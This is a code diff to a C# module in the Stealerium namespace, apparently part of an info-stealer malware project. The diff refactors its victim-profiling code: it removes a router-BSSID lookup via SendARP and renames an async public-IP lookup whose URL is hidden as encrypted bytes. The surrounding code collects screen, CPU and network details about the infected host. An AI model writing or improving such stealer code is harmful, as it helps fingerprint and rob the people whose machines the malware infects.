@@ -31,10 +31,6 @@ namespace Stealerium.Target.System
         // Current date
         public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");
 
-        [DllImport("iphlpapi.dll", ExactSpelling = true)]
-        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint physicalAddrLen);
-
-
         // Get screen metrics
         public static string ScreenMetrics()
         {
@@ -183,7 +179,7 @@ namespace Stealerium.Target.System
         }
 
         // Get public IP
-        public static async Task<string> GetPublicIp()
+        public static async Task<string> GetPublicIpAsync()
         {
             try
             {
@@ -195,7 +191,7 @@ namespace Stealerium.Target.System
                         238, 56, 3, 133, 224, 68, 195, 226, 41, 226, 22, 191
                     }); // http://icanhazip.com
 
-                    var externalip = await client.GetStringAsync(url);
+                    var externalip = await client.GetStringAsync(url).ConfigureAwait(false);
                     return externalip.Replace("\n", "");
                 }
             }
@@ -205,31 +201,6 @@ namespace Stealerium.Target.System
             }
 
             return "Request failed";
-        }
-
-        // Get router BSSID
-        private static string GetBssid()
-        {
-            var macAddr = new byte[6];
-            var macAddrLen = (uint)macAddr.Length;
-            try
-            {
-                var ip = GetDefaultGateway();
-                if (SendARP(BitConverter.ToInt32(IPAddress.Parse(ip).GetAddressBytes(), 0), 0, macAddr,
-                        ref macAddrLen) != 0)
-                    return "unknown";
-
-                var v = new string[(int)macAddrLen];
-                for (var j = 0; j < macAddrLen; j++)
-                    v[j] = macAddr[j].ToString("x2");
-                return string.Join(":", v);
-            }
-            catch
-            {
-                // ignored
-            }
-
-            return "Failed";
         }
 
         // Get CPU name
